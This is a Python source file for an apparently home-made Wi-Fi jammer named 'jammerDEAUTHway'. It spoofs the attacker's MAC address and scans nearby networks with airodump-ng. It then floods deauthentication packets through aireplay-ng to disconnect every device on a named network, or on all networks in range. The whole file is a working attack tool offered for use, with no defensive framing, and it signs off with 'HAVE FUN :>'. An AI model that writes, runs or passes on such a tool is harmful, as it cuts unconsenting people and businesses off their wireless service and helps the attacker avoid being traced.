import subprocess
import os
import time
import optparse
import re
try:
    import sqlite3
except ImportError:
    print("[-] sqlite3 is not installed!")

CRED = '\033[41m'
CEND = '\033[0m'

text = f"""                     ▄▀░░▌
                   ▄▀▐░░░▌
                ▄▀▀▒▐▒░░░▌
     ▄▀▀▄   ▄▄▀▀▒▒▒▒▌▒▒░░▌
    ▐▒░░░▀▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒█
    ▌▒░░░░▒▀▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄
   ▐▒░░░░░▒▒▒▒▒▒▒▒▒▌▒▐▒▒▒▒▒▀▄
    ▌▀▄░░▒▒▒▒▒▒▒▒▐▒▒▒▌▒▌▒▄▄▒▒▐
   ▌▌▒▒▀▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒█▄█▌▒▒▌
 ▄▀▒▐▒▒▒▒▒▒▒▒▒▒▒▄▀█▌▒▒▒▒▒▀▀▒▒▐░░░▄
▀▒▒▒▒▌▒▒▒▒▒▒▒▄▒▐███▌▄▒▒▒▒▒▒▒▄▀▀▀▀
▒▒▒▒▒▐▒▒▒▒▒▄▀▒▒▒▀▀▀▒▒▒▒▄█▀░░▒▌▀▀▄▄
▒▒▒▒▒▒█▒▄▄▀▒▒▒▒▒▒▒▒▒▒▒░░▐▒▀▄▀▄░░░░▀
▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▄▒▒▒▒▄▀▒▒▒▌░░▀▄
▒▒▒▒▒▒▒▒▀▄▒▒▒▒▒▒▒▒▀▀▀▀▒▒▒▄▀     ▂▃▅▇█▓▒░۩۞۩ jammerDEAUTHway ۩۞۩░▒▓█▇▅▃▂"""
print(text)
print("\nHi jumppy :>\n\n")

def is_package_installed(*args):
    counter = 0
    for package_name in args:
        which_output = subprocess.getoutput(f"which {package_name}")
        if os.path.exists(which_output):
            print(f"[+] {package_name} is installed!")
            counter += 1
        else:
            print(f"[-] {package_name} is NOT installed!")
    if counter == len(args):
        return True
    else:
        return False
    
def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--target", dest="targetname", type=str, help="Specific target name to be attacked!\nIf all then do NOT use this parameter!")
    parse_object.add_option("-n","--number", dest="number_of_packages",type=int, default=0, help="How many packages will be sent to the target(s)!(default=0=unlimited)")
    parse_object.add_option("-m","--mac",dest="mac_address",type=str, help="Temporary new MAC address.")
    parse_object.add_option("-q", "--quality", dest="quality_of_the_attack", type=int, default=1, help="Enter a number between 1 and 20. The higher the number, the higher the quality of the attack as well as the time taken!\n(default=1)")

    return parse_object.parse_args()

def change_mac_address(mac_address):
        interface_name = get_interface_name()
        if is_monitor():
            re_eneable_managedmode(interface_name)
            time.sleep(3)
        interface_name = get_interface_name()
        subprocess.call(["ifconfig", interface_name,"down"])
        time.sleep(1)
        subprocess.call(["ifconfig", interface_name,"hw","ether", mac_address])
        time.sleep(1)
        subprocess.call(["ifconfig", interface_name,"up"])
        time.sleep(3)
        
def control_new_mac(interface_name):
    ifconfig = subprocess.check_output(["ifconfig", interface_name])
    new_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig))
    if new_mac:
        return new_mac.group(0)
    else:
        return None

def get_interface_name():
    process_of_interface_output = subprocess.getoutput("iw dev | grep Interface")
    interface_name = process_of_interface_output.split("\n")[0]  # Searching for interface name
    interface_name = interface_name[11:]  # Getting the name only
    
    return str(interface_name)

def change_interface_mod(interface_name):
    os.system("airmon-ng start " + interface_name)

def is_monitor():
    process_of_type_output = subprocess.getoutput("iw dev | grep type")
    type_of_card = process_of_type_output.split("\n")[0]
    type_of_card = type_of_card[7:]
    print("--> Network Adaper Mode: ", type_of_card)
    if type_of_card == 'monitor':
        return True
    if type_of_card == 'managed':
        print("\nYou may want to change the mod of your WIFI card manually.")
        return False

def scan_network(interface_name_monitor):
    print("...scanning...")
    files_first = os.listdir("./firstScan")
    number_of_files_first = len(files_first)
    os.system(f"xterm -e timeout -s 9 10 airodump-ng -w ./firstScan/output_of_scan{number_of_files_first} --output-format kismet.csv {interface_name_monitor}")
    sleep(10)

def scan_all_network(interface_name_monitor):
    print("...scanning...")
    files_allf = os.listdir("./allScan/allfScan")
    number_of_files_allf = len(files_allf)
    os.system(f"xterm -e timeout -s 9 10 airodump-ng -w ./allScan/allfScan/output_of_scan{number_of_files_allf} --output-format kismet.csv {interface_name_monitor}")
    sleep(10)

def get_targets(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()
    macs = f"""SELECT BSSID FROM dump"""
    c.execute(macs)
    macs = c.fetchall()
    channels = f"SELECT Channel FROM dump"
    c.execute(channels)
    channels = c.fetchall()

    return macs, channels

def get_bssid_and_channel(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()
    bssid = f"""SELECT bssid FROM dump WHERE ESSID ='{targetname}'"""
    c.execute(bssid)
    bssid = c.fetchone()[0]
    channel = f"""SELECT channel FROM dump WHERE ESSID ='{targetname}'"""
    c.execute(channel)
    channel = c.fetchone()[0]

    return bssid, channel

def scan_devices(interface_name_monitor, bssid, channel):
    print("...scanning...")
    channel = str(channel)
    files_second = os.listdir("./secondScan")
    number_of_files_second = len(files_second)
    os.system(f"xterm -e timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./secondScan/output_of_scan{number_of_files_second} --output-format csv {interface_name_monitor}")
    sleep(15)

def scan_devices_for_all(interface_name_monitor, bssid, channel):
    print("...scanning...")
    channel = str(channel)
    files_alls = os.listdir("./allScan/allsScan")
    number_of_files_alls = len(files_alls)
    os.system(f"xterm -e timeout -s 9 15 airodump-ng -c {channel} --bssid {bssid} -w ./allScan/allsScan/output_of_scan{number_of_files_alls} --output-format csv {interface_name_monitor}")
    sleep(15)

def get_wifi_name(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()
    names = f"""SELECT ESSID FROM dump"""
    c.execute(names)
    names = c.fetchall()
    
    return names

def get_mac_addresses(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()
    macs = f"""SELECT StationMAC FROM dump"""
    c.execute(macs)
    macs = c.fetchall()

    return macs

def drop(device_mac, network_mac, interface_name_monitor):
    os.system(f"xterm -e aireplay-ng -0 {number_of_packages} -a {network_mac} -c {device_mac} --ignore-negative-one {interface_name_monitor}")

def sleep(during):
    during += quality_of_the_attack * 1.5
    time.sleep(during)
    
def clean():
    os.system("rm -rf firstScan/o*")
    os.system("rm -rf secondScan/o*")
    os.system("rm -rf allScan/allfScan/o*")
    os.system("rm -rf allScan/allsScan/o*")

def re_eneable_managedmode(interface_name_monitor):
    os.system(f"airmon-ng stop {interface_name_monitor}")


if is_package_installed("sqlite3", "aircrack-ng", "xterm"):
    print("[+] All packages we need are installed.\n")
else:
    exit("Stopped due to not-installed packages!\n")

(user_input,arguments) = get_user_input()
targetname, number_of_packages, mac_address, quality_of_the_attack = user_input.targetname, user_input.number_of_packages, user_input.mac_address, user_input.quality_of_the_attack

if quality_of_the_attack < 1 or quality_of_the_attack > 20:
    exit("The quality value is NOT valid! Enter a number between 1 and 20! ")

interface_name = get_interface_name()
if not mac_address is None:
    change_mac_address(mac_address)
finalized_mac = control_new_mac(str(get_interface_name()))
if finalized_mac == mac_address:
    print("\n[+] MAC address was changed successfully!\n")
else:
    print(CRED + "\n[-] MAC address could NOT changed!!" + CEND)
    wanna_c = input("Wanna continue without changing your MAC address. This can be dangerous![Y/n]: ")
    if wanna_c == "n":
        exit("Stopped!")
        
print(f"\n\nOptions:\nSpecified Target: {targetname} (None = all targets)\nPackage quantity: {number_of_packages}  (0 = unlimited)\nYour MAC address: {control_new_mac(get_interface_name())}")
print(CRED + "\nAre you sure to start the attack with the above settings?[Y/n]" + CEND)
sure = input("\n: ")
s = ["y", "Y", ""]
if sure not in s:
    exit("Stopped!")


clean()
if not is_monitor():
    change_interface_mod(get_interface_name())

if is_monitor():
    print("[+] The mode has changed to monitor instead of managed.")
    interface_name_monitor = get_interface_name()

    if targetname == None:
        print("[+] All WIFI that the WIFI card can reach have been chosen as target!")
        time.sleep(1)
        # ALL SCAN
        scan_all_network(interface_name_monitor)
        files_allf = os.listdir("./allScan/allfScan")
        number_of_files_allf = len(files_allf)
        os.system(f"./kismet2sqlite.sh ./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv")
        print("...creating databases...")
        time.sleep(1.5)
        os.system(f"rm -r ./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv")

        db_name = f"./allScan/allfScan/output_of_scan{number_of_files_allf - 1}-01.kismet.csv.db"
        targets, channels = get_targets(db_name)
        names = get_wifi_name(db_name)

        for i in range(0, len(targets)):

            name = str(names[i])[2:-3]
            bssid = str(targets[i])[2:19]
            channel = str(channels[i])[1:-2]
            print("--> Current Target WiFi: ", CRED + name + CEND, bssid, channel)

            scan_devices_for_all(interface_name_monitor, bssid, channel)
            files_alls = os.listdir("./allScan/allsScan")
            number_of_files_alls = len(files_alls)
            os.system(f"./kismet3sqlite.sh ./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv")
            print("...creating databases...")
            time.sleep(1.5)
            os.system(f"rm -r ./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv")

            db_name = f"./allScan/allsScan/output_of_scan{number_of_files_alls - 1}-01.csv.db"
            macs = get_mac_addresses(db_name)
            print("--> Available Targets: ", macs)
            counter = 0
            for mac in macs:
                mac = str(mac)
                mac = mac[2:19]
                print("--> Current Target Device: ", CRED + mac + CEND)
                if len(mac) == 17:
                    drop(mac, bssid, interface_name_monitor)
                    time.sleep(5)
                    counter += 1
                if len(macs) == 1:
                    print(CRED + "\nThere is not any devices connected to the WIFI!\nOr you are not close enough to the WIFI!" + CEND + "\n\n\n\n\n\n")
                    time.sleep(1)
            if counter == len(macs):
                print(CRED + "[+] All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")
        re_enable = input("[?] Wanna re-enable managed mode?[Y/n]:\n")
        if re_enable in s:
            re_eneable_managedmode()
            print("Setting your wifi card to its old settings...")
            time.sleep(2)
            print("[+] Your network can reachable now! Have a good one c:")

    else:
        print(f"'{targetname}' has been chosen as target!")
        time.sleep(0.3)
        ## FIRST SCAN
        scan_network(interface_name_monitor)
        files_first = os.listdir("./firstScan")
        number_of_files_first = len(files_first)
        os.system(f"./kismet2sqlite.sh ./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv")
        print("...creating databases...")
        time.sleep(1.5)
        os.system(f"rm -r ./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv")

        db_name = f"./firstScan/output_of_scan{number_of_files_first - 1}-01.kismet.csv.db"
        bssid, channel = get_bssid_and_channel(db_name)
        print("--> Current Target WiFi: ", bssid, channel)

        # SECOND SCAN
        scan_devices(interface_name_monitor, bssid, channel)
        files_second = os.listdir("./secondScan")
        number_of_files_second = len(files_second)
        os.system(f"./kismet3sqlite.sh ./secondScan/output_of_scan{number_of_files_second - 1}-01.csv")
        print("...creating databases...")
        time.sleep(1.5)
        os.system(f"rm -r ./secondScan/output_of_scan{number_of_files_second - 1}-01.csv")

        db_name = f"./secondScan/output_of_scan{number_of_files_second - 1}-01.csv.db"
        macs = get_mac_addresses(db_name)
        print("--> Current Target Devices: ", macs)
        counter = 0

        for mac in macs:
            mac = str(mac)[2:19]
            print("--> Current Target Device: ", CRED + mac + CEND)
            if len(mac) == 17:
                drop(mac, bssid, interface_name_monitor)
                time.sleep(5)
                counter += 1
            if len(macs) == 1:
                print(CRED + "\nThere is not any devices connected to the WIFI!\nOr you are not close enough to the WIFI!" + CEND + "\n\n\n\n\n\n")
                time.sleep(1)
        if counter == len(macs):
            print(CRED + "[+] All devices have been dropped from the WIFI you chose!" + CEND + "\nHAVE FUN :>")
        re_enable = input("[?] Wanna re-enable managed mode?[Y/n]:\n")
        if re_enable in s:
            re_eneable_managedmode(interface_name_monitor)
            print("Setting your wifi card to its old settings.")
            time.sleep(2)
            print("[+] Your network can reachable now! Have a good one c:")

else:
    print("[-] The mode could NOT changed to monitor instead of managed." + CRED +"\nYou should run it as root!" + CEND)


